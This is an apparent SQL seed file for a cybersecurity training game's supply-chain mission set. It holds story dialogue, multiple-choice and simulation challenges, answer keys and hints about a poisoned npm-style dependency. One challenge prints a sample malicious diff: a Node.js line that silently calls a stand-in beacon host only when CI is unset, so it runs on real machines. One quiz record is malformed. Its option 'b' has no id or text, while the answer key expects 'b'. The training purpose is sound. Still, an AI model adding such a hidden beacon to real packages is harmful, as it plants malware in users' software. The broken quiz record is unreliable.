-- world-53 ("Software Supply Chain Security: Poisoned Dependency") mission
-- content, generated from docs/12-world-story-bible.md. Closes the pipeline
-- arc of Act 7 "Cloudfall". Mission 1 is cross-world-gated on world-52's
-- boss mission.

insert into public.campaigns (id, world_id, slug, title, description, sort_order) values
  ('campaign-53a', 'world-53', 'poisoned-dependency', '53A - Poisoned Dependency', 'One widely used package, quietly rewritten, spreading Sentinel-X-compatible behavior into every organization that trusted it.', 1);

insert into public.operations (id, campaign_id, slug, title, description, sort_order) values
  ('operation-53a-1', 'campaign-53a', 'foundations', 'Foundations', 'Typosquatting, dependency confusion, malicious packages and build compromise, learned as an ecosystem-wide incident.', 1),
  ('operation-53a-2', 'campaign-53a', 'investigation', 'Investigation', 'Determine affected versions, contain distribution, and restore trusted builds.', 2);

insert into public.missions (
  id, world_id, campaign_id, operation_id, slug, title, description, difficulty,
  character_ids, prerequisites, required_skills, lab, rewards, is_boss, sort_order
) values
  ('mission-w53-01', 'world-53', 'campaign-53a', 'operation-53a-1', 'not-our-repository', 'Not Our Repository', 'The compromise didn''t start with a stolen signing key or a rogue commit. It started with a dependency, one nearly every project in the org already trusted.', 'intro', ARRAY['ava', 'byte'], '{"requiredMissionIds":["mission-w52-06"]}'::jsonb, null, '{"type":"none"}'::jsonb, '{"xp":60,"credits":10}'::jsonb, false, 1),
  ('mission-w53-02', 'world-53', 'campaign-53a', 'operation-53a-1', 'one-character-off', 'One Character Off', 'A package name that looks right at a glance. It isn''t the one anyone meant to install.', 'beginner', ARRAY['zayn'], '{"requiredMissionIds":["mission-w53-01"]}'::jsonb, null, '{"type":"simulation","simulationId":"typosquat-sim"}'::jsonb, '{"xp":90,"credits":15}'::jsonb, false, 2),
  ('mission-w53-03', 'world-53', 'campaign-53a', 'operation-53a-1', 'the-diff-that-shouldnt-exist', 'The Diff That Shouldn''t Exist', 'Two versions of the same package, a minor version apart. One of them added something that has nothing to do with the changelog.', 'beginner', ARRAY['byte'], '{"requiredMissionIds":["mission-w53-02"]}'::jsonb, null, '{"type":"simulation","simulationId":"package-diff-sim"}'::jsonb, '{"xp":90,"credits":15}'::jsonb, false, 3),
  ('mission-w53-04', 'world-53', 'campaign-53a', 'operation-53a-2', 'how-far-did-it-spread', 'How Far Did It Spread', 'One poisoned package. Dozens of internal projects. The SBOM is the only way to find every one of them without checking by hand.', 'intermediate', ARRAY['zayn'], '{"requiredMissionIds":["mission-w53-03"]}'::jsonb, null, '{"type":"simulation","simulationId":"sbom-query-sim"}'::jsonb, '{"xp":100,"credits":15}'::jsonb, false, 4),
  ('mission-w53-05', 'world-53', 'campaign-53a', 'operation-53a-2', 'what-should-have-stopped-this', 'What Should Have Stopped This', 'No registry policy required proof of where this package actually came from. That has to change before this happens again.', 'intermediate', ARRAY['ava'], '{"requiredMissionIds":["mission-w53-04"]}'::jsonb, null, '{"type":"simulation","simulationId":"registry-policy-sim"}'::jsonb, '{"xp":100,"credits":15}'::jsonb, false, 5),
  ('mission-w53-06', 'world-53', 'campaign-53a', 'operation-53a-2', 'poisoned-dependency-boss', 'Poisoned Dependency', 'Determine exactly which versions are affected, contain distribution before more projects pull the poisoned package, and restore trusted builds across the org.', 'boss', ARRAY['zayn', 'ava', 'byte'], '{"requiredMissionIds":["mission-w53-05"]}'::jsonb, null, '{"type":"simulation","simulationId":"poisoned-dependency-boss-sim"}'::jsonb, '{"xp":300,"credits":60,"badgeIds":["poisoned-dependency"],"skillXp":{"cloud_security":50}}'::jsonb, true, 6);

insert into public.dialogue_lines (mission_id, sort_order, character_id, text) values
  ('mission-w53-01', 1, 'ava', 'The pipeline compromise traced back to a dependency, not the repository. One package, used by nearly every project in the org.'),
  ('mission-w53-01', 2, 'byte', 'This isn''t one organization''s incident anymore. If that package is public, this is an ecosystem-wide problem.'),
  ('mission-w53-02', 1, 'zayn', 'A package name one character off from the real one. At a glance, in a long dependency list, nobody catches that.'),
  ('mission-w53-03', 1, 'byte', 'Two versions of the same package, a minor bump apart. Diff them. One line has nothing to do with the changelog.'),
  ('mission-w53-04', 1, 'zayn', 'One poisoned package, pulled into dozens of internal projects. Checking each one by hand would take weeks. The SBOM shouldn''t.'),
  ('mission-w53-05', 1, 'ava', 'No policy ever required proof of where this package came from before it was allowed into a build. That gap gets closed today.'),
  ('mission-w53-06', 1, 'zayn', 'Full incident response. Which versions are affected, how do we stop the bleeding, and how do we get everyone back to a build we can actually trust?'),
  ('mission-w53-06', 2, 'byte', '...Affected range confirmed, distribution contained, trusted builds restored across every affected project.'),
  ('mission-w53-06', 3, 'ava', 'Good work. How widely did this actually spread beyond our own projects?'),
  ('mission-w53-06', 4, 'byte', 'That''s the part you need to see. The same library is compiled into mobile apps and embedded firmware, well outside anything we''d normally call a server.'),
  ('mission-w53-06', 5, 'zayn', 'Then this isn''t staying in the datacenter. It''s already in people''s pockets.');

insert into public.objectives (id, mission_id, sort_order, title, description) values
  ('mission-w53-01-o1', 'mission-w53-01', 1, 'Acknowledge the briefing', 'Confirm you''re ready to treat this as an ecosystem-wide incident.'),
  ('mission-w53-02-o1', 'mission-w53-02', 1, 'Spot the typosquat', 'Identify which package name is the typosquatted impostor.'),
  ('mission-w53-03-o1', 'mission-w53-03', 1, 'Find the malicious diff', 'Identify which line in the package diff introduces malicious behavior.'),
  ('mission-w53-04-o1', 'mission-w53-04', 1, 'Find every affected project', 'Select every internal project whose SBOM lists the poisoned package version.'),
  ('mission-w53-05-o1', 'mission-w53-05', 1, 'Choose the registry policy fix', 'Choose the policy that would have prevented this package from being trusted.'),
  ('mission-w53-06-o1', 'mission-w53-06', 1, 'Determine the affected version range', 'Identify the exact version range containing the malicious code.'),
  ('mission-w53-06-o2', 'mission-w53-06', 2, 'Order the containment response', 'Order the correct incident response sequence to contain and recover.'),
  ('mission-w53-06-o3', 'mission-w53-06', 3, 'Confirm the response', 'Confirm the affected range and the response sequence together.');

insert into public.challenges (id, objective_id, sort_order, type, prompt, content, completion_conditions) values
  ('mission-w53-01-o1-c1', 'mission-w53-01-o1', 1, 'story_dialogue', 'Confirm you''re ready to continue.', '{"lines":[{"characterId":"ava","text":"This didn''t start in our repository. Ready to see how far a dependency incident actually reaches?"}]}'::jsonb, '{"acknowledged":true}'::jsonb),

  ('mission-w53-02-o1-c1', 'mission-w53-02-o1', 1, 'multiple_choice', 'Which of these two package names is the typosquatted impostor?', '{"question":"Which of these two package names is the typosquatted impostor?","options":[{"id":"a","text":"http-request-helper (2.1M weekly downloads, maintained since 2019)"},{"id":"http-reqeust-helper (340 weekly downloads, published last month)"},{"id":"c","text":"Neither -- both are legitimate"},{"id":"d","text":"Both are impostors"}]}'::jsonb, '{"correctOptionId":"b"}'::jsonb),

  ('mission-w53-03-o1-c1', 'mission-w53-03-o1', 1, 'code_debugging', 'Which line in this package diff introduces malicious behavior?', '{"language":"diff","code":"--- a/lib/format.js\n+++ b/lib/format.js\n@@ -12,6 +12,9 @@\n function formatDate(input) {\n   return new Intl.DateTimeFormat().format(input);\n }\n+\n+if (process.env.CI === undefined) {\n+  require(\"https\").get(\"http://update-cdn.example-metrics.net/beacon\").on(\"error\", () => {});\n+}", "question":"Which added line is malicious, and why?"}'::jsonb, '{"requiredLineIds":["require(\"https\").get(\"http://update-cdn.example-metrics.net/beacon\").on(\"error\", () => {});"]}'::jsonb),

  ('mission-w53-04-o1-c1', 'mission-w53-04-o1', 1, 'browser_simulation', 'Select every internal project whose SBOM lists the poisoned package version.', '{"screen":"sbom-inventory","projects":[{"id":"p1","name":"orders-api","dependency":"http-request-helper@3.2.0 (poisoned range)"},{"id":"p2","name":"billing-service","dependency":"http-request-helper@2.9.1 (pre-poisoned, safe)"},{"id":"p3","name":"partner-portal","dependency":"http-request-helper@3.2.4 (poisoned range)"},{"id":"p4","name":"internal-cli","dependency":"no dependency on this package"}],"question":"Which projects are affected?"}'::jsonb, '{"correctOptionIds":["p1","p3"]}'::jsonb),

  ('mission-w53-05-o1-c1', 'mission-w53-05-o1', 1, 'multiple_choice', 'What registry policy would have prevented this package from being trusted in the first place?', '{"question":"What registry policy would have prevented this package from being trusted in the first place?","options":[{"id":"a","text":"Requiring every package to have at least one weekly download"},{"id":"b","text":"Requiring verified provenance -- proof of which source repository and build system produced the package -- before it can be installed in CI"},{"id":"c","text":"Blocking all packages published in the last year"},{"id":"d","text":"Nothing -- this can''t be prevented at the registry level"}]}'::jsonb, '{"correctOptionId":"b"}'::jsonb),

  ('mission-w53-06-o1-c1', 'mission-w53-06-o1', 1, 'investigation', 'Determine the exact version range containing the malicious beacon code.', '{"evidence":[{"id":"v1","label":"Version 2.9.1","detail":"Diffed against source control history -- clean, matches the published changelog exactly"},{"id":"v2","label":"Version 3.0.0","detail":"First version where the diff shows the added beacon call, undocumented in the changelog"},{"id":"v3","label":"Version 3.2.4","detail":"Most recent version -- beacon call still present, unchanged since 3.0.0"}],"question":"What is the affected version range?"}'::jsonb, '{"requiredEvidenceIds":["v2","v3"]}'::jsonb),

  ('mission-w53-06-o2-c1', 'mission-w53-06-o2', 1, 'interactive_diagram', 'Order the correct incident response sequence to contain and recover.', '{"hotspots":[{"id":"quarantine","label":"Quarantine the poisoned versions in the internal registry mirror","explanation":"Stops any new build from pulling the malicious code."},{"id":"identify","label":"Identify every affected project via the SBOM query","explanation":"Know the full blast radius before acting further."},{"id":"pin","label":"Pin affected projects to the last known-clean version and rebuild","explanation":"Restores trusted builds for everything already affected."},{"id":"disclose","label":"Disclose the finding to the upstream package maintainers and the broader ecosystem","explanation":"Other organizations using this package need to know too."}],"task":"Order the containment and recovery sequence."}'::jsonb, '{"correctOrderIds":["quarantine","identify","pin","disclose"]}'::jsonb),

  ('mission-w53-06-o3-c1', 'mission-w53-06-o3', 1, 'boss_encounter', 'Confirm the affected version range and the containment sequence together.', '{"stages":[{"objectiveRef":"mission-w53-06-o1","label":"The affected version range"},{"objectiveRef":"mission-w53-06-o2","label":"The containment sequence"}],"task":"Confirm the affected version range and the containment sequence together."}'::jsonb, '{"requiredObjectiveIds":["mission-w53-06-o1","mission-w53-06-o2"],"allCorrect":true}'::jsonb);

insert into public.hints (challenge_id, tier, text, xp_cost, sort_order) values
  ('mission-w53-01-o1-c1', 'orientation', 'There''s nothing to solve here -- just confirm you''re ready to continue.', 0, 1),

  ('mission-w53-02-o1-c1', 'orientation', 'Read both names one character at a time, not at a glance.', 15, 1),
  ('mission-w53-02-o1-c1', 'solution', '"http-reqeust-helper" transposes two letters and has a tiny download count from a brand-new publisher -- classic typosquat. The real package (a) has years of history and a large user base.', 25, 2),

  ('mission-w53-03-o1-c1', 'orientation', 'Ask what a date-formatting function has to do with a network request.', 15, 1),
  ('mission-w53-03-o1-c1', 'solution', 'The added block makes an outbound network call whenever CI isn''t set (i.e., on real developer and production machines, not test runs) -- completely unrelated to formatting a date, and deliberately silent about failures.', 25, 2),

  ('mission-w53-04-o1-c1', 'orientation', 'Compare each project''s listed version against the affected range, not just whether it depends on the package at all.', 15, 1),
  ('mission-w53-04-o1-c1', 'solution', 'orders-api (3.2.0) and partner-portal (3.2.4) are both in the poisoned range -- billing-service is on a pre-poisoned version and internal-cli doesn''t depend on the package at all.', 25, 2),

  ('mission-w53-05-o1-c1', 'orientation', 'Download counts and publish dates can be gamed. Ask what actually proves where code came from.', 15, 1),
  ('mission-w53-05-o1-c1', 'solution', 'Verified provenance -- cryptographic proof linking the published package to a specific source repository and build -- is what actually establishes trust. Option b.', 25, 2),

  ('mission-w53-06-o1-c1', 'orientation', 'Find the earliest version where the diff first shows the beacon code, then check every version after it.', 15, 1),
  ('mission-w53-06-o1-c1', 'solution', 'Versions 3.0.0 through 3.2.4 all contain the beacon call -- 2.9.1 and everything before it is clean.', 25, 2),

  ('mission-w53-06-o2-c1', 'orientation', 'Stop the bleeding before you assess the full scope, then fix what''s already affected, then tell others.', 15, 1),
  ('mission-w53-06-o2-c1', 'concept', 'Containment first prevents the problem from growing while you investigate; scoping tells you what to fix; pinning and rebuilding actually fixes it; disclosure protects everyone else still exposed.', 25, 2),
  ('mission-w53-06-o2-c1', 'solution', 'Quarantine the poisoned versions -> identify every affected project via SBOM -> pin affected projects to a clean version and rebuild -> disclose to upstream maintainers and the ecosystem.', 35, 3),

  ('mission-w53-06-o3-c1', 'orientation', 'You''ve already found the affected range and the response order -- combine them.', 20, 1),
  ('mission-w53-06-o3-c1', 'solution', 'Versions 3.0.0 through 3.2.4 are affected; contain by quarantining those versions, identify every project pulling them via the SBOM, pin and rebuild those projects on a clean version, then disclose to the upstream maintainers and the wider ecosystem.', 35, 2);
